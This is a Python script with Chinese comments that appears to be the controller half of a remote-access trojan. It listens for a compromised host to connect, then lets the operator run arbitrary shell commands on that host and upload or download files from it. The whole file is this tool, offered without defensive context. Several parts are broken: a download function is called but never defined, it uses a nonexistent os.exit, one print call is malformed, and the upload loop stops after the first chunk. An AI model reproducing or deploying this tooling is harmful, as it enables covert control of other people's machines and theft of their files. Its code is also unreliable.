#!/usr/bin/python3  
# -*- coding: utf-8 -*-  
  
import socket  
import os  
import struct  

def ExecCommand(conn, addr):  
    while True:  
        command = input("[ExecCommand]>>> ")  # 添加了空格，使输入更清晰  
        if command == 'exit':  # 使用双等号进行比较  
            conn.sendall('exit'.encode())  # 发送编码后的字符串通知客户端退出  
            break  # 退出循环，关闭连接  
        conn.sendall(command.encode())  
        result = conn.recv(10000).decode()  # 仍然使用10000作为接收数据的长度，但你可能需要根据实际情况调整  
        print(result)

def TransferFiles(conn, addr):  
    print("Usage: method filepath")  
    print("Example: upload /root/ms08067| download /root/ms08067")  
    while True:  
        command = input("[TransferFiles]>>> ")  # 添加了空格，使输入更清晰  
        command_list = command.split()  # 对输入进行命令和参数分割  
        if command_list[0] == 'exit':  # 主控端退出相应模块时，也要通知被控端退出对应的功能模块  
            conn.sendall('exit'.encode())  # 发送编码后的字符串通知客户端退出  
            break  # 退出循环，关闭连接  
        elif command_list[0] == 'download':  # 若方法为 download，则表示主控端需要获取被控端的文件  
            DownloadFile(conn, addr, command)  
        elif command_list[0] == 'upload':  # 若方法为 upload，则表示主控端需要向被控端上传文件  
            UploadFile(conn, addr, command)

def UploadFile(conn, addr, command):  
    # 把主控端的命令发送给被控端  
    conn.sendall(command.encode())  
      
    # 从命令中分离出要上传的文件的路径  
    command_list = command.split()  
      
    while True:  
        upload_file_path = command_list[1]  
          
        if os.path.isfile(upload_file_path):  
            # 先传输文件信息，用来防止粘包  
            # 定义文件信息，128s表示文件名长度为128字节，l表示用int类型表示文件大小  
            # 把文件名和文件大小信息进行封装，发送给接收端  
            file_info = struct.pack('128sl', bytes(os.path.basename(upload_file_path).encode('utf-8')), os.stat(upload_file_path).st_size)  
            conn.sendall(file_info)  
            print('[+]FileInfo send success! name:{0} size:{1}'.format(os.path.basename(upload_file_path), os.stat(upload_file_path).st_size))  
            # 开始传输文件的内容  
            print('[+]start uploading...')  
            with open(upload_file_path, 'rb') as f:  
                while True:  
                    # 分块多次读，防止文件过大时一次性读完导致内存不足  
                    data = f.read(1024)  
                    if not data:  
                        print("File Send 0ver!")  
                        break  
                    conn.sendall(data)  
                    break

def main():  
    serverIP = '127.0.0.1'  # 主控端监听地址  
    serverPort = 6666  # 主控端监听端口  
    serverAddr = (serverIP, serverPort)  # 主控端开始监听地址和端口  
  
    try:  
        serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 创建TCP/IP socket对象  
        serverSocket.bind(serverAddr)  # 绑定地址和端口  
        serverSocket.listen(1)  # 开始监听连接请求  
    except socket.error as message:  
        print(message)  
        os.exit(0)  # 退出程序  
  
    print("[*]Server is up!!!")  
  
    conn, addr = serverSocket.accept()  # 接收并打印上线主机的主机名、地址和端口  
    hostName = conn.recv(1024)  # 接收上线主机的主机名、地址和端口信息  
    print("[+]Host is up!\n ===\n name:{0} ip:{1} \n port:{2}\n === \n", format(bytes.decode(hostName), addr[0], addr[1]))  
  
    try:  
        while True:  # 主循环，持续接收用户输入并执行相应功能  
            print("Functional selection:\n")  
            print('[1]ExecCommand \n[2]TransferFiles\n')  
            choice = input('[None]>>>')  # 接收用户输入的选择  
  
            if choice == '1':  # 进入ExecCommand功能模块  
                conn.sendall('1'.encode())  # 给被控端发送指令，主控端进入相应的功能模块，发送的命令为str型，需要用encode函数把命令转换为bytes型  
                ExecCommand(conn, addr)  # 调用执行命令的功能函数，传入连接对象和地址信息  
            elif choice == '2':  # 进入TransferFiles功能模块  
                conn.sendall('2'.encode())  # 给被控端发送指令，主控端进入相应的功能模块，发送的命令为str型，需要用encode函数把命令转换为bytes型  
                TransferFiles(conn, addr)  # 调用文件传输功能函数，传入连接对象和地址信息  
            elif choice == 'exit':  # 退出程序  
                conn.sendall('exit'.encode())  # 给被控端发送退出指令，发送的命令为str型，需要用encode函数把命令转换为bytes型  
                serverSocket.close()  # 关闭服务器套接字，退出程序  
            else:  # 如果用户输入非法字符，则提示用户重新输入并继续循环  
                print("Invalid choice. Please try again.")  
    except:  # 如果发生异常，则关闭服务器套接字并退出程序  
        serverSocket.close()  # 关闭服务器套接字，退出程序  
  
if __name__ == '__main__':  # 主程序入口，如果当前脚本被直接运行而非作为模块导入时执行以下代码块  
    main()  # 调用主函数，开始执行程序逻辑